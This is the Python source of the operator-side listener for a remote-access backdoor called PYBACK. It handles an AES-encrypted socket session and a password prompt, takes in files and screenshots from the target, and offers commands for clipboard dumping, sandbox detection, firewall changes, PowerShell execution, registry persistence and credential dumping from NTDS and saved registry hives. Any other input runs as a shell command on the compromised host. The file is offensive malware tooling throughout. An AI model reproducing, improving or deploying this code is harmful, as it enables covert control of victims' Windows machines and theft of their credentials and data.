#!/usr/bin/python
# -*- encoding: utf-8 -*-

import base64
import hashlib
import json
import socket
import sys
from time import *

from Crypto import Random
from Crypto.Cipher import AES

global password

# AES password ####################
password = "djknBDS89dHFS(*HFSD())"

# color codes ###########
red = "\033[1;32;31m"
green = "\033[1;32;32m"
yellow = "\033[1;32;33m"
blue = "\033[1;32;34m"
cyan = "\033[1;32;36m"
black = "\033[1;32;30m"
r = "\x1b[0m"

banner = blue + """

██████╗░██╗░░░██╗██████╗░░█████╗░░█████╗░██╗░░██╗
██╔══██╗╚██╗░██╔╝██╔══██╗██╔══██╗██╔══██╗██║░██╔╝
██████╔╝░╚████╔╝░██████╦╝███████║██║░░╚═╝█████═╝░
██╔═══╝░░░╚██╔╝░░██╔══██╗██╔══██║██║░░██╗██╔═██╗░
██║░░░░░░░░██║░░░██████╦╝██║░░██║╚█████╔╝██║░╚██╗
╚═╝░░░░░░░░╚═╝░░░╚═════╝░╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝

Created by: 7h3w4lk3r

https://github.com/7h3w4lk3r

""" + r

# help command banner ##########################################################
help = """


File & Directory 
================

 command                description
 -------                -----------      
 cd                     change directory (USE WITHOUT QUOTES IN PATH NAME)            
 download               download a file (no directories or files bigger than 10Mb)                     
 upload                 upload a file  (no directories or files bigger than 10Mb)
 

System and Shell
================    

 command                description
 -------                -----------
 sysinfo                 print system and OS information   
 checkvm                 check if the system is a sandbox or VM 


User Interface 
==============

 command                description
 -------                -----------
 shot                   take a screenshot                           
 clip                   dump clipboard    
                                                    
            
Post Exploitation 
=================

 command                description
 -------                -----------
 fw                     add firewall rule: fw [in/out] [port] [rule name]
 powershell             run powershell command or script      
 spawn                  spawn a separate powershell session, -h for help


Persistence
===========

 command                description
 -------                -----------
persist_reg             Windows persistence using registry key ( on boot )
 


Credentials
===========

 command                description
 -------                -----------
 dump_ntds                    dump credentials using ntds  in C:\Windows\Temp\copy-ntds            
 dump_regsave                 dump credentials using reg save in C:\Windows\Temp\     


Listener/Backdoor Commands
==========================

 command                description
 -------                -----------
 q                       terminate the backdoor                                                       
 exit                    terminate the listener       
                 
                                    
============================================================
ALL OTHER COMMANDS WILL BE EXECUTED AS SYSTEM SHELL COMMANDS                 
============================================================
 \n"""


# AES encryption/decryption #######################################################
class AESCipher(object):
    def __init__(self, key):
        self.bs = AES.block_size
        self.key = hashlib.sha256(key.encode()).digest()

    def encrypt(self, raw):
        raw = self._pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return base64.b64encode(iv + cipher.encrypt(raw.encode()))

    def decrypt(self, enc):
        enc = base64.b64decode(enc)
        iv = enc[:AES.block_size]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self._unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')

    def _pad(self, s):
        return s + (self.bs - len(s) % self.bs) * chr(self.bs - len(s) % self.bs)

    @staticmethod
    def _unpad(s):
        return s[:-ord(s[len(s) - 1:])]


# main listener class ##############################################################
class listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(3)
        print cyan, yellow, "\n[*] waiting for connection... [*]", r
        global addr
        self.conn, addr = listener.accept()
        print green, "\n[+] session opened for ", str(addr[0]), ":",\
            str(addr[1]), "at ", strftime("%Y-%m-%d %H:%M:%S",
            gmtime()), " [+]\n", r
        while True:
            pwd = raw_input("\033[36m [*] Enter backdoor access password: \x1b[0m")
            self.json_send(pwd)
            result = self.receive()
            print result
            if result == "\n [+] access granted [+] \n":
                break
            else:
                continue


    # encrypt/decrypt data ##############################
    def encrypt(self, message):
        encrypted = AESCipher(password).encrypt(message)
        return encrypted

    def decrypt(self, message):
        decrypted = AESCipher(password).decrypt(message)
        return decrypted

    # send/receive data #########################################################
    def json_send(self, data):
        try:
            json_data = json.dumps(data)
            return self.conn.send(self.encrypt(json_data))
        except:
            return self.conn.send(self.encrypt("[-] STDOUT parsing problem [-]"))
            pass

    def receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.conn.recv(4096)
                return json.loads(self.decrypt(json_data))
            except ValueError:
                continue
            except:
                pass

    # write/write file ##################################
    def write_file(self, path, content):
        try:
            with open(path, "wb") as file:
                file.write(base64.b64decode(content))
                return "[+] download completed [+]"
        except:
            return "[-] download failed [-]"

    def read_file(self, path):
        try:
            with open(path, "rb") as file:
                return base64.b64encode(file.read())
        except:
            return "[-] no such file or directory [-]"

    # send/receive commands ##########
    def execution(self, cmd):
        if cmd[0] == "exit":
            self.conn.close()
            exit()
        self.json_send(cmd)
        return self.receive()

    # execute commands #############################################################################
    def run(self):
        shot_count = 1
        while True:
            cmd = raw_input("\033[1;32;33m" + str(addr[0]) + ':' + str(addr[1]) + " >>>\x1b[0m ")
            cmd = cmd.split(" ")
            try:
                if cmd[0] == "exit":
                    while True:
                        choice = raw_input("\n \033[1;32;31m[!] exit the listener (y/n) ? \x1b[0m")
                        if choice == "y":
                            self.conn.close()
                            exit()
                        elif choice == "n":
                            cmd[0] = None
                            break
                        else:
                            continue

                elif cmd[0] == "help":
                    print help
                    cmd[0] = ' '

                elif cmd[0] == "q":
                    while True:
                        choice = raw_input("\n \033[1;32;31m[!] terminate the session (y/n) ? \x1b[0m")
                        if choice == "y":
                            break
                        elif choice == "n":
                            cmd[0] = None
                            break
                        else:
                            continue
                    pass

                elif cmd[0] == "spawn" and len(cmd) != 3 or cmd[0] == "spawn" and cmd[1] == "-h":
                    print red, "usage: spawn [target ip] [target port] ", r
                    cmd = ""

                elif cmd[0] == "powershell" and len(cmd) != 2 or cmd[0] == "powershell" and cmd[1] == "-h":
                    print red, "usage: powershell [command] OR [script] ", r
                    cmd = ""

                elif cmd[0] == "download" and not cmd[1:] or cmd[0] == "upload" and not cmd[1:]:
                    print red, "usage: download/upload [file name] ", r
                    cmd = ""
                elif cmd[0] == "upload" and cmd[1]:
                    print blue, "[*] uploading ", str(cmd[1:]), "...", r
                    file_content = self.read_file(cmd[1])
                    cmd.append(file_content)
                result = self.execution(cmd)
                if result == None:
                    pass

                elif cmd[0] == "download" and cmd[1]:
                    print blue, "[*] Downloading ", ''.join(str(cmd[1])), "...", r
                    result = self.write_file(cmd[1], result)
                    print(result)

                elif cmd[0] == "shot":
                    name = "screenshot%s.png" % str(shot_count)
                    result = self.write_file(name, result)
                    print green, "[+] screenshot captured [+]", r
                    shot_count += 1

                elif cmd[0] == "fw" and len(cmd) != 4 or cmd[0] == "fw" and cmd[1] == "-h":
                    print red, "[!] usage: fw [in/out] [port number] [rule name] [!]", r
                    cmd = ""
                else:
                    print(result)
            except Exception:
                result = Exception


# run the listener ####################
if __name__ == '__main__':
    try:
        print banner
        ip = raw_input("LHOST (default: 0.0.0.0) >>> ")
        port = raw_input("LPORT >>> ")
        if ip == "":
            ip = '0.0.0.0'
        port = int(port)
        print cyan, "\nlistener started on ", ip, ":", port, "...", r
        starter = listener(ip, port)
        starter.run()
    except KeyboardInterrupt:
        sys.exit(0)
    except Exception, e:
        print e

